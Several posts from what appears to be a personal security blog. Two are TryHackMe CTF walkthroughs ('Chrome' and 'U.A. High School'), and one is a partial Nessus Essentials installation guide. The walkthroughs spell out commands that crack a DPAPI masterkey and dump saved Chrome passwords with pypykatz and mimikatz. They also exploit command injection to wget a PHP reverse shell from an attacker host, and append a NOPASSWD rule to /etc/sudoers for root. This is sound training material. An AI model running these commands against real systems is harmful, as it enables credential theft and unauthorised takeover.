[{"categories":["CTF","Forensic"],"content":"Introduction Detailed walkthroughs for Chrome CTF challenges on TryHackMe .\nDescription A password manager is only as strong as the password that encrypts it. You find that a malicious actor extracted something over the network, but what? Help us find out!\n1.What is the first password that we find? 2.What is the URL found in the first index? Fully defang the URL 3.What is the password found in the first index? 4.What is the URL found in the second index? Fully defang the URL 5.What is the password found in the second index? From the above questions, we assume that will find the paswords and urls using the task file.\nEnumaration We downloaded the task file from Chrome|THM page, and unzipped it. We got a .pcapng file.\n-rw-r--r-- 1 root root 73M Mar 18 21:36 chromefiles-1697949492677.zip -rwxr-xr-x 1 root root 73M Oct 22 2023 traffic.pcapng Wireshark Wireshark:traffic.pcapng Protocol Hieraracy By checking Statics --\u0026gt; Protocol Hieraracy, we have SMB data in the captured file.\nExport- SMB objects list We got the interesting files to be extracted.\n-rw-r--r-- 1 root root 72M Aug 18 22:33 encrypted_files -rw-r--r-- 1 root root 160 Aug 18 22:36 srvsvc -rw-r--r-- 1 root root 5.5K Aug 18 22:36 transfer.exe ILSpy Lets try to get more information from these files, start with transfer.exe. Here we need to reverse .exe file, using git/icsharpcode/ilspy-vscode reference \u0026ndash;\u0026gt;HackTricks:ReversingTools:ILSpy \u0026ndash;\u0026gt; ILSpy Extension .\nILSpy Extension VSCode Installing/updating latest version of VSCode and installing ILSpy Extension VSCode extension.\nDecompiling transfer.exe Right click on exe file and select Decompile Selected assembly to decompile the file.\nDecompiled output From the above image we knows the function of tranfer.exe file:\nReads the data from C:\\Users\\hadri\\Downloads\\files.zip and encrypt as C:\\Users\\hadri\\Downloads\\encrypted_files. Encryption algorithm used is AES. Key: PjoM95MpBdz85Kk7ewcXSLWCoAr7mRj1 IV (Initialization Vector): lR3soZqkaWZ9ojTX Decrypting AES Lets decrypt the encrypted file.\nfrom Crypto.Cipher import AES from Crypto.Util.Padding import unpad import sys # Replace these with your actual decryption key and initialization vector (IV) key = b\u0026#34;PjoM95MpBdz85Kk7ewcXSLWCoAr7mRj1\u0026#34; # 16-byte key (128-bit) iv = b\u0026#34;lR3soZqkaWZ9ojTX\u0026#34; # 16-byte IV def decrypt_file(encrypted_file_path, decrypted_file_path): \u0026#34;\u0026#34;\u0026#34;Decrypts a file using AES-128 in CBC mode with PKCS#7 padding. Args: encrypted_file_path (str): Path to the encrypted file. decrypted_file_path (str): Path to save the decrypted file. \u0026#34;\u0026#34;\u0026#34; with open(encrypted_file_path, \u0026#39;rb\u0026#39;) as encrypted_file: ciphertext = encrypted_file.read() cipher = AES.new(key, AES.MODE_CBC, iv) plaintext = unpad(cipher.decrypt(ciphertext), AES.block_size) with open(decrypted_file_path, \u0026#39;wb\u0026#39;) as decrypted_file: decrypted_file.write(plaintext) # Example usage (replace paths accordingly) encrypted_file_path = sys.argv[1] decrypted_file_path = sys.argv[2] decrypt_file(encrypted_file_path, decrypted_file_path) print(\u0026#34;File decrypted successfully!\u0026#34;) I fed the transfer.exe contents, containing an encryption mechanism, to an AI tool, and it produced the necessary decryption script. Save the above python script as decryption.py.\npip3 install pycryptodome # to use Crypto in Python env python3 decryption.py encrypted_files decrypted_file.zip unzip decrypted_file.zip -d decrypted_files Now we got the decrypted contents of the file encrypted_files. Let\u0026rsquo;s go through the files.\nAppData [Windows] We have the AppData file of Windows OS, which is a hidden system folder that stores application data and settings specific to the user profile. It is used by Windows and installed applications to store user-specific information such as configuration files, temporary files, saved sessions, caches, and other necessary data.\nGoogle Search: Chrome Passwords AppData We got a interesting file result in simple google search. Lets analyze that.\nSolving using Linux $ file decrypted_files/AppData/Local/Google/Chrome/User\\ Data/Default/Login\\ Data decrypted_files/AppData/Local/Google/Chrome/User Data/Default/Login Data: SQLite 3.x database, last written using SQLite version 3039004, page size 2048, file counter 1, database pages 23, cookie 0xd, schema 4, UTF-8, version-valid-for 1 Found an interesting database file.\nAppData/Roaming/Microsoft/Protect/S-1-5-21-3854677062-280096443-3674533662-1001/8c6b6187-8eaa-48bd-be16-98212a441580 AppData/Local/Google/Chrome/User\\ Data/Default/Login\\ Data AppData/Local/Google/Chrome/User\\ Data/Local\\ State After further enumaration found some other important files.\nDB Browser for SQLite DB Browser for SQLite Using pre installed DB Browser for SQLite in Kali Linux, We found an Database Structure and interesting table logins using the file Login Data.\nTable: Logins We got the important data like usernames, passwords and website urls from the database. But here the password field contains the binary data which is unreadable.\nHere we got flag2 and flag4.\nDPAPImk2john We can use DPAPImk2john to crack the users password to proceed further.\npip install pycryptodome # installing dependency for DPAPImk2john $ DPAPImk2john -h usage: DPAPImk2john [-h] [-S SID] [-mk MASTERKEY] [-d] [-c {domain,domain1607+,domain1607-,local}] [-P PREFERRED] [--password PASSWORD] options: -h, --help show this help message and exit -S SID, --sid SID SID of account owning the masterkey file. -mk MASTERKEY, --masterkey MASTERKEY masterkey file (usually in %APPDATA%\\Protect\\\u0026lt;SID\u0026gt;). -d, --debug -c {domain,domain1607+,domain1607-,local}, --context {domain,domain1607+,domain1607-,local} context of user account. 1607 refers to Windows 10 1607 update. -P PREFERRED, --preferred PREFERRED \u0026#39;Preferred\u0026#39; file containing GUID of masterkey file in use (usually in %APPDATA%\\Protect\\\u0026lt;SID\u0026gt;). Cannot be used with any other command. --password PASSWORD password to decrypt masterkey file. DPAPImk2john Tool Usage.\n$ DPAPImk2john -S \u0026#34;S-1-5-21-3854677062-280096443-3674533662-1001\u0026#34; -mk AppData/Roaming/Microsoft/Protect/S-1-5-21-3854677062-280096443-3674533662-1001/8c6b6187-8eaa-48bd-be16-98212a441580 -c \u0026#34;local\u0026#34; $DPAPImk$2*1*S-1-5-21-3854677062-280096443-3674533662-1001*aes256*sha512*8000*46bc22dbffb7cfe4cfc5895acf364a94*288*a332e98ce791b7416157137e7193596d4594dc599acc321f6ed9e94a818879461639b958099ab61361c7fd4d6668ca2d8995488ffba78758b945dcbfc60498c84b14c8021fbee8d90cf4165637222c8a6cd1eb3c5a85acf85177b1ec86240c7e077eb5e427e27832f3481664baf54c06cb3bb47bcfc253620958f02f69bc98ece8e51b6ef3c498047efb4a2b57bf804b $ $ DPAPImk2john -S \u0026#34;S-1-5-21-3854677062-280096443-3674533662-1001\u0026#34; -mk AppData/Roaming/Microsoft/Protect/S-1-5-21-3854677062-280096443-3674533662-1001/8c6b6187-8eaa-48bd-be16-98212a441580 -c \u0026#34;local\u0026#34; \u0026gt; ../DPAPIdecryption.txt Generating the hash to decrypt using DPAPImk2john.\n$ john ../DPAPIdecryption.txt --wordlist=/usr/share/wordlists/rockyou.txt Using default input encoding: UTF-8 Loaded 1 password hash (DPAPImk, DPAPI masterkey file v1 and v2 [SHA1/MD4 PBKDF2-(SHA1/SHA512)-DPAPI-variant 3DES/AES256 256/256 AVX2 8x]) [password-redacted] (?) Session completed. Cracking the passsword of the user using John the Ripper tool.\nHere we got the flag 1.\npypykatz Here we found a tool called pypykatz , used to crack the chrome passwords.\nProcess of decrypting DPAPI secrets This diagram shows how to get the secrets(passwords). AS YOU CAN SEE to get secrets you will need multiple things, just waving one file an expecting things to magically decrypt themselves will not work.\n$ pypykatz dpapi chrome -h usage: pypykatz dpapi chrome [-h] [--logindata LOGINDATA] [--cookies COOKIES] mkf localstate $ $ pypykatz dpapi masterkey -h usage: pypykatz dpapi masterkey [-h] [-o OUT_FILE] masterkeyfile prekey $ $ pypykatz dpapi prekey password test_password usage: pypykatz password [-h] [-o OUT_FILE] sid password Use these commands for known the tool usage.\n$ pypykatz dpapi prekey password S-1-5-21-3854677062-280096443-3674533662-1001 [password-redacted] 31a620ca577e6ad02ae701673bee51d32aa5538b 16f809ed93fff267679b64095ec2ed54f20da076 266c0db66dda55bcf2a3bf948c9176f9d0073f30 $ pypykatz dpapi masterkey -o mk1.txt 8c6b6187-8eaa-48bd-be16-98212a441580 31a620ca577e6ad02ae701673bee51d32aa5538b $ pypykatz dpapi chrome --logindata Login\\ Data mk1.txt Local\\ State file: Login Data user: Administrator pass: b\u0026#39;[redacted-Password]\u0026#39; url: file: Login Data user: chrome pass: b\u0026#39;[redacted-Password]\u0026#39; url: We got the passwords here (Flag 3 and Flag 5).\nSolving using Windows DPAPImk2john.py PS Z:\\\u0026gt; pip install --user pycryptodome PS Z:\\\u0026gt; notepad DPAPImk2john.py Installing dependency for DPAPImk2john.py and copy pasting the .py file using notepad. Tool: JohnTheRipper , latest version for Windowsx64 .\nPS Z:\\\u0026gt; python .\\DPAPImk2john.py -S \u0026#34;S-1-5-21-3854677062-280096443-3674533662-1001\u0026#34; -mk \u0026#34;Z:\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-3854677062-280096443-3674533662-1001\\8c6b6187-8eaa-48bd-be16-98212a441580\u0026#34; -c \u0026#34;local\u0026#34; \u0026gt; hash.txt PS Z:\\\u0026gt; john-1.9.0-jumbo-1-win64\\run\\john.exe hash.txt --wordlist=rockyou.txt Error: UTF-16 BOM seen in input file. Running john.exe to crack the password, we got the error.\nPS Z:\\\u0026gt; $InputFile = \u0026#34;hash.txt\u0026#34; ; $OutputFile = \u0026#34;hash_utf8.txt\u0026#34;; $Text = Get-Content -Path $InputFile -Raw; $Text | Out-File -FilePath $OutputFile -Encoding utf8 Converting the data from UTF-16 to UTF-8 format to solve the error and saving it in hash_utf8.txt.\nPS Z:\\\u0026gt; john-1.9.0-jumbo-1-win64\\run\\john.exe .\\hash_utf8.txt --wordlist=rockyou.txt Using default input encoding: UTF-8 Loaded 1 password hash (DPAPImk, DPAPI masterkey file v1 and v2 [SHA1/MD4 PBKDF2-(SHA1/SHA512)-DPAPI-variant 3DES/AES256 256/256 AVX2 8x]) Cost 1 (iteration count) is 8000 for all loaded hashes Will run 2 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status [password-redacted] (?) 1g 0:00:00:00 DONE (2024-09-09 06:40) 4.807g/s 307.6p/s 307.6c/s 307.6C/s 123456..charlie Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed Successfully cracked the user password.\nmimikatz PS Z:\\\u0026gt; Z:\\mimikatz\\x64\\mimikatz.exe # starting mimi .#####. mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08 .## ^ ##. \u0026#34;A La Vie, A L\u0026#39;Amour\u0026#34; - (oe.eo) ## / \\ ## /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) ## \\ / ## \u0026gt; https://blog.gentilkiwi.com/mimikatz \u0026#39;## v ##\u0026#39; Vincent LE TOUX ( vincent.letoux@gmail.com ) \u0026#39;#####\u0026#39; \u0026gt; https://pingcastle.com / https://mysmartlogon.com ***/ Lets use Mimikatz .\nMASTERKEY mimikatz # dpapi::masterkey /in:\u0026#34;Z:\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-3854677062-280096443-3674533662-1001\\8c6b6187-8eaa-48bd-be16-98212a441580\u0026#34; /sid:S-1-5-21-3854677062-280096443-3674533662-1001 /password:[password redacted] /protected **MASTERKEYS** dwVersion : 00000002 - 2 szGuid : {8c6b6187-8eaa-48bd-be16-98212a441580} dwFlags : 00000005 - 5 dwMasterKeyLen : 000000b0 - 176 dwBackupKeyLen : 00000090 - 144 dwCredHistLen : 00000014 - 20 dwDomainKeyLen : 00000000 - 0 [masterkey] **MASTERKEY** dwVersion : 00000002 - 2 salt : 46bc22dbffb7cfe4cfc5895acf364a94 rounds : 00001f40 - 8000 algHash : 0000800e - 32782 (CALG_SHA_512) algCrypt : 00006610 - 26128 (CALG_AES_256) pbKey : a332e98ce791b7416157137e7193596d4594dc599acc321f6ed9e94a818879461639b958099ab61361c7fd4d6668ca2d8995488ffba78758b945dcbfc60498c84b14c8021fbee8d90cf4165637222c8a6cd1eb3c5a85acf85177b1ec86240c7e077eb5e427e27832f3481664baf54c06cb3bb47bcfc253620958f02f69bc98ece8e51b6ef3c498047efb4a2b57bf804b [backupkey] **MASTERKEY** dwVersion : 00000002 - 2 salt : 16b1972d3eb971ab727d3ad4e392c1ca rounds : 00001f40 - 8000 algHash : 0000800e - 32782 (CALG_SHA_512) algCrypt : 00006610 - 26128 (CALG_AES_256) pbKey : bc71f554919b4d147bf51f53950fa13278979eef7398d84ecf500988864dc52eecbe9a0201a74dbb62f38e3b7957e5aa67297c29292cba05a46007bc04f1237304ee4b064442356be165ea54e0ed2664adeb1abbeb98bfe0f5b714f00d50da8d0e9271908b036dcb2aff44f2724f41bd [credhist] **CREDHIST INFO** dwVersion : 00000003 - 3 guid : {ba7fc17c-8195-4272-afae-c9fc71e42540} [masterkey] with volatile cache: SID:S-1-5-21-3854677062-280096443-3674533662-1001;GUID:{ba7fc17c-8195-4272-afae-c9fc71e42540};MD4:753621b31cbdb532e69fcb2e64924cfe;SHA1:f6f173c285829fccc958584ac81ae15a572fd69c; key : ca4387eb0a71fc0eea23e27f54b9ae240379c9e82a05d6fca73ecee13ca2e0e4d98390844697d8ed10715415c56152653edf460a47b70ddb868a03ee6a3f9840 sha1: 217522c457cfe8a95da45da81d6b898080e2067d [masterkey] with password: [password redacted] (protected user) key : ca4387eb0a71fc0eea23e27f54b9ae240379c9e82a05d6fca73ecee13ca2e0e4d98390844697d8ed10715415c56152653edf460a47b70ddb868a03ee6a3f9840 sha1: 217522c457cfe8a95da45da81d6b898080e2067d Here we got the Master Key. We need encrypted key to proceed further, which we found in AppData/Local/Google/Chrome/User Data/Local State.\nEncrypted Key Cyberchef: encrypted_key Here we got the encrypted key, we can use it.\nmimikatz # dpapi::chrome /in:\u0026#34;Z:\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data\u0026#34; /masterkey:\u0026#34;ca4387eb0a71fc0eea23e27f54b9ae240379c9e82a05d6fca73ecee13ca2e0e4d98390844697d8ed10715415c56152653edf460a47b70ddb868a03ee6a3f9840\u0026#34; /encryptedKey:RFBBUEkBAAAA0Iyd3wEV0RGMegDAT8KX6wEAAACHYWuMqo69SL4WmCEqRBWAAAAAAAIAAAAAABBmAAAAAQAAIAAAAHPuV6P/8jN+rng8E61Z0xxi2hUf4Q4oxa5gFqSnctqdAAAAAA6AAAAAAgAAIAAAAAEF9lst8zMKmCFJ3WmD46TZY/xJF+s5Xf9mTQ2wa16ZMAAAABFU2C2V+l6K3y7ROKkA0cIaWyuXB9i7zUwBBu6mt7vM2QGZtqmjhcX6ZSWrX8JUwkAAAADgBkMLAP19Rtax5T8aKAESgwV+ABz65DOgEGwwSkkQMbWrwz7p42SzpfJUj7jcyUSTOblLRNtB8YTwhm3wCQSi \u0026gt; Encrypted Key seems to be protected by DPAPI * volatile cache: GUID:{8c6b6187-8eaa-48bd-be16-98212a441580};KeyHash:217522c457cfe8a95da45da81d6b898080e2067d;Key:available * masterkey : ca4387eb0a71fc0eea23e27f54b9ae240379c9e82a05d6fca73ecee13ca2e0e4d98390844697d8ed10715415c56152653edf460a47b70ddb868a03ee6a3f9840 \u0026gt; AES Key is: 9a3094f1bfe3e19d5d039fb569d35d49ad083ac34dbcd5d9e42a506b8d4a192c URL : https://[url redacted]/ ( https://[url redacted]/ ) Username: Administrator * using BCrypt with AES-256-GCM Password: [password redacted] URL : https://[url redacted]/ ( https://[url redacted]/ ) Username: chrome * using BCrypt with AES-256-GCM Password: [password redacted] We solved the lab.\nHappy Hacking !!! \u0026#x1f60e;\n","permalink":"https://cyberjagadeesh.github.io/posts/chrome/writeup/","tags":["Wireshark","ILSpy","AppData[Windows]","DPAPImk2john","john","pypykatz","mimikatz"],"title":"Chrome | THM Writeup"},{"categories":["CTF"],"content":"Introduction Detailed walkthroughs for U.A. High School CTF challenges on TryHackMe .\nSummary This CTF challenge required participants to identify and exploit a hidden OS command injection vulnerability in the U.A. Superhero Academy\u0026rsquo;s website. Successful exploitation led to gaining root privileges on the system.\nVulnerability The website contains a hidden functionality that allows for the execution of shell commands. This vulnerability can be exploited to gain unauthorized access to the system.\nExploitation By enumerating the website, a valid user and password were discovered. Using sudo privileges, a script was executed on the system to escalate privileges to root level. Tools Used rustscan, ffuf, curl, nc, wget, hexeditor, steghide, ssh\nEnumaration echo \u0026#34;10.10.72.235 uahschool.com\u0026#34;\u0026gt;\u0026gt; /etc/hosts Lets start with mapping the target ip with uahschool.com.\n$ rustscan -a uahschool.com -- -sC -sV Open 10.10.72.235:22 Open 10.10.72.235:80 [\u0026gt;] Running script \u0026#34;nmap -vvv -p {{port}} {{ip}} -sC -sV\u0026#34; on ip 10.10.72.235 PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 60 OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 58:2f:ec:23:ba:a9:fe:81:8a:8e:2d:d8:91:21:d2:76 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC4WNbSymq7vKwxstoKDOXzTzNHnE4ut9BJPBlIb44tFvtMpfpXDF7Bq7MT9q4CWASVfZTw763S0OrtvpBFPpN/4eOvlircakFfkR3hZk7dHOXe8+cHXDth90XnMa2rq5CfxwinqP/Mo67XcpagbpU9O5lCatTMPWBUcEhIOXY8aUSMkmN6wRYSxdI40a4IYsjRqkqsdA6yaDQBSx+ryFRXwS9+kpUskAv452JKi1u2H5UGVX862GC1xAYHapKY24Yl6l5rTToGqTkobHVCv6t9dyaxkGtc/Skoi2mkWE/GM0SuqtbJ9A1qhSrfQRNpcIJ6UaVhDdUeO3qPX2uXPyLrY+i+1EgYEsRsxD5ym0bT1LPby8ONPduBEmZfnNoN5IBR05rQSSHhj349oNzDC4MRn2ygzOyx0n0c7wqffaAuohbu0cpeAcl5Nwb/Xw42RABDFQx08CttjNmtPMK/PqFt+H4nubyp7P8Pwctwi3wLf2GbU1lNgT0Ewf2GnfxY5Bs= | 256 9d:f2:63:fd:7c:f3:24:62:47:8a:fb:08:b2:29:e2:b4 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBC+IqWgEnT5Asc+8VrYsQACkIjP+2CKuoor+erbKjpKwM8+X+1TPuwG56O6LxOLXeS2/pFjv9PBFI1oqHKa4GNw= | 256 62:d8:f8:c9:60:0f:70:1f:6e:11:ab:a0:33:79:b5:5d (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHQa5m2TxGI3a9ZwhAd0zWsAYwCsYANdo6fgpS8XiJKL 80/tcp open http syn-ack ttl 60 Apache httpd 2.4.41 ((Ubuntu)) | http-methods: |_ Supported Methods: OPTIONS HEAD GET POST |_http-title: U.A. High School |_http-server-header: Apache/2.4.41 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Lets start with rustscan, we found 2 open ports - port 22(ssh) and port 80(webserver) and the operating system used is Linux. Lets start with webserver.\nuahschool.com Home Page OS Command Injection $ ffuf -c -u http://uahschool.com/FUZZ -w /usr/share/wordlists/dirb/big.txt -e .html,.php,.jsp about.html [Status: 200, Size: 2542, Words: 276, Lines: 53, Duration: 167ms] admissions.html [Status: 200, Size: 2573, Words: 232, Lines: 64, Duration: 169ms] assets [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 146ms] # directory contact.html [Status: 200, Size: 2056, Words: 142, Lines: 72, Duration: 157ms] courses.html [Status: 200, Size: 2580, Words: 180, Lines: 88, Duration: 148ms] index.html [Status: 200, Size: 1988, Words: 171, Lines: 62, Duration: 160ms] $ ffuf -c -u http://uahschool.com/assets/FUZZ -w /usr/share/wordlists/dirb/big.txt -e .html,.php,.jsp images [Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 140ms] index.php [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 165ms] $ ffuf -c -u http://uahschool.com/assets/index.php?FUZZ=ls -w /usr/share/wordlists/dirb/big.txt -fs 0 cmd [Status: 200, Size: 40, Words: 1, Lines: 1, Duration: 159ms] Our initial fuzz testing revealed various HTML files and a directory named \u0026ldquo;assets/\u0026rdquo;. Further exploration through fuzzing the \u0026ldquo;assets/\u0026rdquo; directory uncovered the presence of \u0026ldquo;index.php\u0026rdquo; and another directory named \u0026ldquo;images/\u0026rdquo;. Fuzzing the \u0026ldquo;images/\u0026rdquo; directory yielded no significant results. Interestingly, the URL http://uahschool.com/assets/index.php itself didn\u0026rsquo;t generate a response from the server.\nHowever, by fuzzing the query parameters for \u0026ldquo;index.php\u0026rdquo;, we discovered a parameter named \u0026ldquo;cmd\u0026rdquo;. This suggests that the script \u0026ldquo;index.php\u0026rdquo; might be able to execute commands through this parameter, as demonstrated by the example URL http://uahschool.com/assets/index.php?cmd=ls\n$ curl http://uahschool.com/assets/index.php?cmd=id dWlkPTMzKHd3dy1kYXRhKSBnaWQ9MzMod3d3LWRhdGEpIGdyb3Vwcz0zMyh3d3ctZGF0YSkK $ curl http://uahschool.com/assets/index.php?cmd=id | base64 -d uid=33(www-data) gid=33(www-data) groups=33(www-data) $ curl http://uahschool.com/assets/index.php?cmd=which+nc+python+python3 | base64 -d /usr/bin/nc /usr/bin/python3 $ curl http://uahschool.com/assets/index.php?cmd=pwd | base64 -d /var/www/html/assets The response we got using Command Injection is base64 encoded. From the above results we got that we are able to run commands as user www-data in /var/www/html/assets location. To get reverse shell we can use nc or python.\nExploitation Tried to got reverse shell using python3 and nc but it failed. Used pentestmonkey/php-reverse-shell for creating a php rev-shell payload.\npython -m http.server 8080 Started a Python http-server to transfer the payload in the location of payload directory.\n$ nc -nvlp 1234 listening on [any] 1234 ... Listening in port in 1234 for getting the reverse shell.\ncurl http://uahschool.com/assets/index.php?cmd=wget%20http://10.10.1.100:8080/php-reverse-shell.php curl http://uahschool.com/assets/php-reverse-shell.php Downloading php-reverse-shell.php and executing it gives us the reverse shell.\npython3 -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; ^Z #(Ctrl+Z) stty raw -echo \u0026amp;\u0026amp; fg export TERM=xterm Got stable shell by running above commands.\n$ cat /etc/passwd | grep bash root:x:0:0:root:/root:/bin/bash deku:x:1000:1000:deku:/home/deku:/bin/bash During enumaration we found a valid user deku in the system.\nwww-data@myheroacademia:/var/www/Hidden_Content$ cat passphrase.txt | base64 -d AllmightForEver!!! During enumaration found an interesting file /var/www/Hidden_Content/passphrase.txt but its not the password for user deku.\noneforall.jpg Further enumaration we got a assets/images/oneforall.jpg file, but not able to open it in webserver. Lets download that and investigate further.\n$ wget http://uahschool.com/assets/images/oneforall.jpg $ file oneforall.jpg oneforall.jpg: data $ exiftool oneforall.jpg ExifTool Version Number : 12.76 File Name : oneforall.jpg Directory : . File Size : 98 kB File Modification Date/Time : 2023:07:09 22:12:05+05:30 File Access Date/Time : 2024:08:25 14:33:48+05:30 File Inode Change Date/Time : 2024:08:25 14:33:43+05:30 File Permissions : -rw-r--r-- File Type : PNG File Type Extension : png MIME Type : image/png Warning : PNG image did not start with IHDR There is data corruption in the image file. Here we can notice that extension is .jpg, but as per meta data image is of type PNG.\nHexeditor hexeditor oneforall.jpg # to edit the hex data of a file # (Ctrl X) to exit from hexeditor Using Wikipedia:List_of_file_signatures to get the hex values of all formats.\nHexEditor orginal data: oneforall.jpg We can see that the hex value of the file is in PNG format.\nHexEditor modified data: oneforall.jpg Now format of the file changed to jpg (JFIF), and now we can open the file.\noneforall.jpg StegHide $ steghide extract -sf oneforall.jpg -p \u0026#39;AllmightForEver!!!\u0026#39; wrote extracted data to \u0026#34;creds.txt\u0026#34;. $ cat creds.txt Hi Deku, this is the only way I\u0026#39;ve found to give you your account credentials, as soon as you have them, delete this file: deku:One?For?All_!!one1/A Finally we found the password for the user deku. Lets ssh deku.\ncat /home/deku/user.txt We got the user flag here.\nPrivilege Escalation deku@myheroacademia:~$ sudo -l [sudo] password for deku: Matching Defaults entries for deku on myheroacademia: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User deku may run the following commands on myheroacademia: (ALL) /opt/NewComponent/feedback.sh We can run /opt/NewComponent/feedback.sh as root user.\n#!/bin/bash echo \u0026#34;Hello, Welcome to the Report Form \u0026#34; echo \u0026#34;This is a way to report various problems\u0026#34; echo \u0026#34; Developed by \u0026#34; echo \u0026#34; The Technical Department of U.A.\u0026#34; echo \u0026#34;Enter your feedback:\u0026#34; read feedback if [[ \u0026#34;$feedback\u0026#34; != *\u0026#34;\\`\u0026#34;* \u0026amp;\u0026amp; \u0026#34;$feedback\u0026#34; != *\u0026#34;)\u0026#34;* \u0026amp;\u0026amp; \u0026#34;$feedback\u0026#34; != *\u0026#34;\\$(\u0026#34;* \u0026amp;\u0026amp; \u0026#34;$feedback\u0026#34; != *\u0026#34;|\u0026#34;* \u0026amp;\u0026amp; \u0026#34;$feedback\u0026#34; != *\u0026#34;\u0026amp;\u0026#34;* \u0026amp;\u0026amp; \u0026#34;$feedback\u0026#34; != *\u0026#34;;\u0026#34;* \u0026amp;\u0026amp; \u0026#34;$feedback\u0026#34; != *\u0026#34;?\u0026#34;* \u0026amp;\u0026amp; \u0026#34;$feedback\u0026#34; != *\u0026#34;!\u0026#34;* \u0026amp;\u0026amp; \u0026#34;$feedback\u0026#34; != *\u0026#34;\\\\\u0026#34;* ]]; then echo \u0026#34;It is This:\u0026#34; eval \u0026#34;echo $feedback\u0026#34; echo \u0026#34;$feedback\u0026#34; \u0026gt;\u0026gt; /var/log/feedback.txt echo \u0026#34;Feedback successfully saved.\u0026#34; else echo \u0026#34;Invalid input. Please provide a valid input.\u0026#34; fi Bypassing Special Character check The above script is the contents of /opt/NewComponent/feedback.sh. Here user input is stored in the variable $feedback and filteration happens if it contains the following pattern [ \u0026ldquo;`\u0026rdquo;, \u0026ldquo;)\u0026rdquo;, \u0026ldquo;$(\u0026rdquo;, \u0026ldquo;|\u0026rdquo;, \u0026ldquo;\u0026amp;\u0026rdquo;, \u0026ldquo;;\u0026rdquo;, \u0026ldquo;?\u0026rdquo;, \u0026ldquo;!\u0026rdquo;, \u0026ldquo;\\\u0026rdquo; ]. Basically they are trying to restrict the user to run command as root user.\nLets look at the other special characters which we can use in linux shell[ \u0026ldquo;~\u0026rdquo;, \u0026ldquo;#\u0026rdquo;, \u0026ldquo;*\u0026rdquo;, \u0026ldquo;[\u0026rdquo;, \u0026ldquo;]\u0026rdquo;, \u0026ldquo;{\u0026rdquo;, \u0026ldquo;}\u0026rdquo;, \u0026ldquo;'\u0026rdquo;, \u0026ldquo;\u0026quot;\u0026rdquo;, \u0026ldquo;\u0026lt;\u0026rdquo;, \u0026ldquo;\u0026gt;\u0026rdquo;, \u0026ldquo;/\u0026rdquo; ].\nIn the above mentioned characters, \u0026ldquo;\u0026gt;\u0026rdquo;, is very useful to redirect the results.\ndeku@myheroacademia:~$ sudo /opt/NewComponent/feedback.sh Hello, Welcome to the Report Form This is a way to report various problems Developed by The Technical Department of U.A. Enter your feedback: Apple is good for Health. \u0026gt; /tmp/test.txt It is This: Feedback successfully saved. deku@myheroacademia:~$ ls -lah /tmp/test.txt -rw-r--r-- 1 root root 26 Aug 25 16:11 /tmp/test.txt deku@myheroacademia:~$ cat /tmp/test.txt Apple is good for Health. Here we tried to create a file as a root user whose content is Apple is good for Health. and it works. Lets use the same to get root privilege.\ndeku@myheroacademia:~$ sudo /opt/NewComponent/feedback.sh Hello, Welcome to the Report Form This is a way to report various problems Developed by The Technical Department of U.A. Enter your feedback: deku ALL=NOPASSWD: ALL \u0026gt;\u0026gt; /etc/sudoers It is This: Feedback successfully saved. deku@myheroacademia:~$ sudo -l Matching Defaults entries for deku on myheroacademia: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User deku may run the following commands on myheroacademia: (ALL) /opt/NewComponent/feedback.sh (root) NOPASSWD: ALL deku@myheroacademia:~$ sudo bash root@myheroacademia:/home/deku# id uid=0(root) gid=0(root) groups=0(root) We got sudo rights to run all commands by giving deku ALL=NOPASSWD: ALL \u0026gt;\u0026gt; /etc/sudoers as feedback.\ncat /root/root.txt Here we got the root flag.\nHappy Hacking !!! \u0026#x1f60e;\n","permalink":"https://cyberjagadeesh.github.io/posts/u.a.highschool/writeup/","tags":["Command Injection","HexEditor","StegHide","SpecialCharacterBypass"],"title":"U.A. High School | THM Writeup"},{"categories":["Tool"],"content":"Intro Nessus is a proprietary vulnerability scanner developed by Tenable, Inc. This blog is about the installation of Nessus Essentials on Linux.\nInstallation Register First lets register in Tenable Nessus Essentials to get the activation code.\nTenable Nessus Essentials Enter your information in the register form shown above, click Get Started.\nDownload Nessus Mail with Activation Code We should have received a mail with Activation Code. Note down the activation code and click the Download Nessus for the downloading page.\nTenable Nessus - Download Select the Platform and Nessus Version then, download the package using prefered method.\nNavigate to the downloaded directory.\ncd ~/Downloads # in case of Linux and downloaded file is in Downloads directory. Install the downloaded package.\nsudo dpkg -i Nessus-*.deb # in case of Debian Linux/Ubuntu Start Nessus Service Start the Nessus service.\n/bin/systemctl start nessusd.service The above command will start the Nessus service, which we can use at https://127.0.0.1:8834/ in browser. Open this URL in browser.\nFollow the process to get into the Nessus home page.\nInstall Offline Check the Register Offline button and click continue.\nSelect Nessus Essentials.\nWe need to have a Listence Key to continue. To get one, lets go with Offline Registration.\nWe need Challenge Code and activation code to move further. We got activation code in the mail received. Follow the below process to get Challenge code.\nChallenge Code sudo /opt/nessus/sbin/nessuscli fetch --challenge By running the above command, will get the challenge code.\nSubmit the challenge code and acivation code.\nNow we should get the Licence.\nCopy and paste the Licence Staring and click Continue.\nNessus Login Create the username and password. Note this for logging in the future.\nNessus Initilizing Nessus installed and initilized successfully.\nPlugin Install Inorder to use Nessus for scanning, plugins should be installed. 